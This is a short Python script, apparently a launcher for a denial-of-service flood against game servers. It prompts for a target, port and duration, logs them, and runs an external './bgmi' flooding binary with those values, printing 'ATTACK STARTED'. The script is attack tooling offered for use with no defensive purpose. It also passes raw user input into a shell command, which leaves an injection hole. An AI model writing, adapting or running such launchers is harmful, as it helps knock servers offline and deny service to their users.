import subprocess
import os
import datetime

# File to store command logs
LOG_FILE = "log.txt"

# Function to log command to the file
def log_command(target, port, time):
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Target: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to start the attack
def start_attack(target, port, time):
    print(f"ATTACK STARTED.\nTarget: {target}\nPort: {port}\nTime: {time} Seconds")
    log_command(target, port, time)
    full_command = f"./bgmi {target} {port} {time} 500"
    process = subprocess.run(full_command, shell=True)
    print(f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}")

# Function to handle user input and execute the attack
def main():
    target = input("Enter the target: ")
    port = int(input("Enter the port: "))
    time = int(input("Enter the time (in seconds): "))

    if time > 600:
        print("Error: Time interval must be less than 600.")
    else:
        start_attack(target, port, time)

if __name__ == "__main__":
    main()
